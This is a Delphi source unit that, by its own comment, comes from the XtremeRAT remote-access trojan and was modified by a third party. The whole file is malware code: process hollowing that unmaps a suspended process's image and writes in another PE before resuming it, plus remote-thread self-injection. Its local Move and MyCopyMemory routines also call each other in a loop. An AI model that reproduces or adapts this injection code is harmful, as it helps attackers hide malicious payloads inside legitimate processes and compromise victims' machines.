unit UnitInjection; //From XtremeRAT 3.6 source code, modified by wrh1d3 :)

interface

uses
	Windows, UnitFunctions;

function RunInMemory(pFilename: string; PI: TProcessInformation): Boolean;
function _RunInMemory(pFunction, rStructAddr: Pointer; PI: TProcessInformation): Pointer;
function MyCreateProcess(pFilename, pCmd: PChar; var PI: TProcessInformation): Boolean;

implementation

function MyCreateProcess(pFilename, pCmd: PChar; var PI: TProcessInformation): Boolean;
var
  SI: TStartUpInfo;
begin
  ZeroMemory(@SI, SizeOf(SI));
  ZeroMemory(@PI, SizeOf(PI));
  CreateProcess(pFilename, pCmd, nil, nil, False, $00000004, nil, nil, SI, PI);
  Result := PI.dwProcessId <> 0;
end;

function _RunInMemory(pFunction, rStructAddr: Pointer; PI: TProcessInformation): Pointer; //fixed by wrh1d3
var
  IDH: PImageDosHeader;
  INH: PImageNtHeaders;
  dwsize, dwimagebase: DWORD;
  bw, ThreadId: Cardinal;
  pRemoteBase: Pointer;
begin
  Result := nil;
  IDH := Pointer(GetModuleHandle(nil));
  INH := Pointer(Cardinal(IDH) + IDH^._lfanew);
  dwsize := INH^.OptionalHeader.SizeOfImage;
  dwimagebase := INH^.OptionalHeader.ImageBase;
  VirtualFreeEx(PI.hProcess, Pointer(dwimagebase), 0, MEM_RELEASE);
  pRemoteBase := VirtualAllocEx(PI.hProcess, Pointer(GetModuleHandle(nil)), dwsize, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE);
  if (Cardinal(pRemoteBase) = 0) then Exit;
  WriteProcessMemory(PI.hProcess, Pointer(dwimagebase), Pointer(GetModuleHandle(nil)), dwsize, bw);
  CreateRemoteThread(PI.hProcess, nil, 0, pFunction, rStructAddr, 0, ThreadId);
  CloseHandle(PI.hProcess);
  Result := pRemoteBase;
end;

procedure MyCopyMemory(Destination: Pointer; Source: Pointer; Length: LongWord);
begin
  Move(Source^, Destination^, Length);
end;

procedure Move(Destination, Source: Pointer; dLength: Cardinal);
begin
  MyCopyMemory(Destination, Source, dLength);
end;
                                     
function NtUnmapViewOfSection(ProcessHandle: THandle;
  BaseAddress: Pointer): DWORD; stdcall; external 'ntdll.dll' name 'NtUnmapViewOfSection';

function RunInMemory(pFilename: string; PI: TProcessInformation): Boolean;
var
  IDH: TImageDosHeader;
  INH: TImageNtHeaders;
  ISH: TImageSectionHeader;
  CONT: TContext;
  ImageBase, bFile: Pointer;
  Ret, Addr, dOffset: DWORD;
  i: Word;
  Buffer: string;
begin
  Result := False;
  Buffer := FileToStr(pFilename);
  if Buffer = '' then Exit;
  bFile := @Buffer[1];

  try
    FillChar(CONT, SizeOf(TContext), 0);
    CONT.ContextFlags := CONTEXT_FULL;
    Move(@IDH, pointer(integer(bFile)), 64);
    Move(@INH, pointer(integer(bFile) + IDH._lfanew), 248);
    GetThreadContext(PI.hThread, CONT);
    ReadProcessMemory(PI.hProcess, Ptr(CONT.Ebx + 8), @Addr, 4, Ret);
    NtUnmapViewOfSection(PI.hProcess, @Addr);
    ImageBase := VirtualAllocEx(PI.hProcess, Ptr(INH.OptionalHeader.ImageBase), INH.OptionalHeader.SizeOfImage, $2000 or $1000, 4);
    WriteProcessMemory(PI.hProcess, ImageBase, pointer(integer(bFile)), INH.OptionalHeader.SizeOfHeaders, Ret);
    dOffset := IDH._lfanew + 248;

    for i := 0 to INH.FileHeader.NumberOfSections - 1 do
    begin
      Move(@ISH, pointer(integer(bFile) + dOffset + (i * 40)), 40);
      WriteProcessMemory(PI.hProcess, Ptr(Cardinal(ImageBase) + ISH.VirtualAddress), pointer(integer(bFile) + ISH.PointerToRawData), ISH.SizeOfRawData, Ret);
      VirtualProtectEx(PI.hProcess, Ptr(Cardinal(ImageBase) + ISH.VirtualAddress), ISH.Misc.VirtualSize, $40, @Addr);
    end;

    Result := WriteProcessMemory(PI.hProcess, Ptr(CONT.Ebx + 8), @ImageBase, 4, Ret);
    CONT.Eax := Cardinal(ImageBase) + INH.OptionalHeader.AddressOfEntryPoint;

    if Result = True then
    begin
      Result := SetThreadContext(PI.hThread, CONT);
      ResumeThread(PI.hThread);
    end;
  except
    CloseHandle(PI.hProcess);
    CloseHandle(PI.hThread);
    Result := False;
  end;
end;

end.
